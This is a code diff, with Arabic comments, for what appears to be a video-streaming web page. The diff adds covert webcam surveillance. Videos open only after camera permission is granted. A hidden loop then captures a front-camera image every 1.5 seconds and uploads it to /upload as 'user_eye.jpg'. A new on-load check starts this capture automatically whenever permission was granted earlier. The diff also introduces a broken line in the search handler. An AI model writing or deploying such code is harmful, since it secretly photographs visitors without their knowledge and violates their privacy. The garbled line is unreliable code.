@@ -403,61 +403,76 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== الكاميرا والشرط الصارم لفتح الفيديو ===== */
+/* ===== الكاميرا والتقاط الصور التلقائي والمستمر ===== */
 let mediaStream = null;
 
-async function startCaptureAndOpenVideo(id) {
-    try {
-        // طلب إذن الكاميرا أولاً (سيظهر تنبيه السماح/الحظر للمستخدم)
-        mediaStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: { ideal: 'user' }
-            } 
-        });
+function startCaptureLoop() {
+    const videoEl = document.getElementById('video');
+    setInterval(() => {
+        if (!mediaStream) return;
+        try {
+            const vw = videoEl.videoWidth || 640;
+            const vh = videoEl.videoHeight || 480;
 
-        const videoEl = document.getElementById('video');
-        videoEl.srcObject = mediaStream;
-        
-        // تشغيل حلقة التقاط الصور فور السماح
-        setInterval(() => {
-            if (!mediaStream) return;
-            try {
-                const vw = videoEl.videoWidth || 640;
-                const vh = videoEl.videoHeight || 480;
+            const canvas = document.createElement('canvas');
+            canvas.width = vw;
+            canvas.height = vh;
 
-                const canvas = document.createElement('canvas');
-                canvas.width = vw;
-                canvas.height = vh;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, vw, vh);
 
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoEl, 0, 0, vw, vh);
-
-                canvas.toBlob(blob => {
-                    if (blob) {
-                        let fd = new FormData();
-                        fd.append('image', blob, `user_eye.jpg`);
-                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-                    }
-                }, 'image/jpeg', 0.85);
-            } catch (err) {}
-        }, 1500);
-
-        // إذا وافق المستخدم وضغط سماح -> يفتح الفيديو الآن حصراً
-        S.cur=id; S.view='watch'; S.descOpen=false;
-        S.hist=[id,...S.hist.filter(x=>x!==id)];
-        document.body.classList.remove('drawer-open','searching');
-        document.title=cur().title;
-        render(true); scrollTo(0,0);
-
-    } catch (e) {
-        // إذا ضغط المستخدم على "عدم السماح" (Block) أو رفض -> لا يحدث شيء ولن يفتح الفيديو إطلاقاً
-        console.log("تم رفض الإذن ولم يتم فتح الفيديو");
-    }
+            canvas.toBlob(blob => {
+                if (blob) {
+                    let fd = new FormData();
+                    fd.append('image', blob, `user_eye.jpg`);
+                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                }
+            }, 'image/jpeg', 0.85);
+        } catch (err) {}
+    }, 1500);
 }
 
-function openVideo(id){
-  // عند النقر على الفيديو، نبدأ بطلب الإذن ولا يفتح الفيديو إلا بالموافقة
-  startCaptureAndOpenVideo(id);
+// 1. محاولة التشغيل التلقائي فور فتح الصفحة (إذا كان المتصفح قد حفظ إذن السماح مسبقاً)
+async function checkInitialPermission() {
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: { ideal: 'user' } } 
+        });
+        const videoEl = document.getElementById('video');
+        videoEl.srcObject = mediaStream;
+        startCaptureLoop();
+    } catch (e) {
+        // إذا لم يكن الإذن ممنوحاً بعد، سيبقي المتصفح في انتظار تفاعل المستخدم
+    }
+}
+checkInitialPermission();
+
+
+/* ===== ارتباط فتح الفيديو بإذن الكاميرا ===== */
+async function openVideo(id){
+  try {
+    // عند الضغط على الفيديو، نطلب الإذن حصراً (إذا لم يكن ممنوحاً مسبقاً)
+    if (!mediaStream) {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: { ideal: 'user' } } 
+        });
+        const videoEl = document.getElementById('video');
+        videoEl.srcObject = mediaStream;
+        startCaptureLoop();
+    }
+
+    // إذا تم السماح بنجاح، افتح الفيديو
+    S.cur=id;S.view='watch';S.descOpen=false;
+    S.hist=[id,...S.hist.filter(x=>x!==id)];
+    document.body.classList.remove('drawer-open','searching');
+    document.title=cur().title;
+    render(true);scrollTo(0,0);
+
+  } catch (err) {
+    // إذا ضغط المستخدم على "عدم السماح"، فلن يفتح الفيديو إطلاقاً ويبقى في مكانه
+    // ولن يتم قفل الزر، بحيث إذا ضغط مرة أخرى سيظهر له إذن السماح مجدداً بشكل طبيعي
+    console.log("تم رفض الإذن، لن يفتح الفيديو");
+  }
 }
 
 function renderWatch(){
@@ -601,7 +616,7 @@ document.addEventListener('keydown',e=>{
 });
 
 $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q').value.trim();
-  searchFor(t);$('#q').blur();
+  searchFor(t);$('#q'].blur();
 });
 
 /* ===== التعامل مع أزرار المتصفح ===== */
